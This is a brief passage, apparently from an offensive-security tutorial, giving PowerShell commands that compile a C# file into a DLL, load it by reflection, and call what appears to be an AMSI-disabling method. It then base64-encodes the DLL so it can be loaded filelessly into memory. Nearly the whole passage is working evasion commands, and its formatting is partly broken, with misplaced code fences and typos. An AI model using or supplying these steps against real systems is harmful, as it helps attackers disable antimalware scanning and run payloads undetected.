To load it into Powershell we can use its native (.NET) API:
```
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -OutputAssembly "Source.dll"
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\\Source.dll")) 
[BP.AMS]::Disable()
```

encode the entire DLL to base64 and create a script that will automatically reflect it to memory and execute it. To encode the dll to 
```
base64 I used this command.
$OriginalCommand = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$pwd\\Source.dll"));$OriginalCommand

```

Loadoad it into memory
````
[Reflection.Assembly]::Load([Convert]::FromBase64String($OriginalCommand)) | Out-Null
```
